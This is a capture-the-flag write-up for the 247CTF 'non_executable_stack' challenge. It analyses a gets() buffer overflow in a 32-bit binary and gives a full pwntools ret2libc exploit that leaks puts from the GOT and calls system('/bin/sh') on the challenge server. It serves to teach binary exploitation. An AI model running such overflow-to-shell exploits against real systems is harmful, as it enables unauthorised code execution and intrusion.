# non_executable_stack - 247CTF PWN Challenge

## Challenge Info
- **Name**: non_executable_stack
- **Category**: PWN
- **Remote**: `tcp://3ce38ede980ff204.247ctf.com:50010`
- **Description**: "There are no hidden flag functions in this binary. Can you make your own without executing from the stack?"

## Flag
```
247CTF{XXXXXXXXXXXXXXXXXXXX}
```

---

## Binary Analysis

### Protections
```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled        <- Can't execute shellcode on stack!
PIE:        No PIE (0x8048000)
```

### Key Functions

#### chall() @ 0x080484d6
```c
void chall() {
    char buffer[0x28];  // 40 bytes
    gets(buffer);       // Vulnerable!
    if (strcmp(buffer, "secret") == 0) {
        puts("Correct!");
    } else {
        puts("Incorrect secret password!");
    }
}
```

### Important Addresses
```
puts@plt:  0x08048390
gets@plt:  0x08048380
puts@got:  0x0804a018
main:      0x0804853d
```

---

## Vulnerability

- **Buffer Overflow**: `gets()` on 40-byte buffer, offset 44 to return address
- **NX Enabled**: Cannot execute shellcode on stack
- **No PIE**: Binary addresses are fixed

---

## Exploitation: ret2libc

Since we can't execute shellcode, we use **return-to-libc** technique:

### Stage 1: Leak libc Address

Use `puts@plt` to print the real address of `puts` in libc:

```
[padding 44] + [puts@plt] + [main] + [puts@got]
                    │          │         │
                call puts   return    argument
```

This prints the runtime address of `puts` in libc, then returns to `main` for stage 2.

### Stage 2: Call system("/bin/sh")

Calculate libc base and addresses:
```
libc_base = leaked_puts - puts_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset
```

Then call system:
```
[padding 44] + [system] + [dummy] + ["/bin/sh"]
                   │         │           │
               call system  return    argument
```

### Libc Offsets (libc6-i386 2.27-3ubuntu1)
```
puts:    0x67360
system:  0x3cd10
/bin/sh: 0x17b8cf
```

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

HOST = "3ce38ede980ff204.247ctf.com"
PORT = 50010

PUTS_PLT = 0x08048390
PUTS_GOT = 0x0804a018
MAIN = 0x0804853d
OFFSET = 44

# Libc offsets (libc6-i386 2.27-3ubuntu1)
PUTS_OFFSET = 0x67360
SYSTEM_OFFSET = 0x3cd10
BINSH_OFFSET = 0x17b8cf

def exploit():
    io = remote(HOST, PORT)

    # Stage 1: Leak puts@libc
    payload1 = b'A' * OFFSET
    payload1 += p32(PUTS_PLT)
    payload1 += p32(MAIN)
    payload1 += p32(PUTS_GOT)

    io.recvline()
    io.sendline(payload1)
    io.recvline()

    leak = io.recvline()
    puts_libc = u32(leak[:4])
    print(f"[+] Leaked puts@libc: {hex(puts_libc)}")

    libc_base = puts_libc - PUTS_OFFSET
    system_addr = libc_base + SYSTEM_OFFSET
    binsh_addr = libc_base + BINSH_OFFSET

    # Stage 2: system("/bin/sh")
    io.recvline()
    payload2 = b'A' * OFFSET
    payload2 += p32(system_addr)
    payload2 += p32(0)
    payload2 += p32(binsh_addr)

    io.sendline(payload2)
    io.sendline(b'cat flag*')
    print(io.recvall(timeout=3).decode())

if __name__ == "__main__":
    exploit()
```

---

## Key Takeaways

1. **NX Bypass**: When stack is non-executable, use ret2libc instead of shellcode
2. **Libc Leak**: Use PLT functions to leak GOT entries and calculate libc base
3. **Two-Stage Attack**: First leak addresses, return to vulnerable function, then exploit
4. **Libc Offsets**: Must match the target's libc version (can use libc-database)
5. **32-bit cdecl**: Arguments on stack after return address

---

## Files
- `non_executable_stack` - Challenge binary
- `solve.py` - Working exploit script
- `flag.txt` - Captured flag
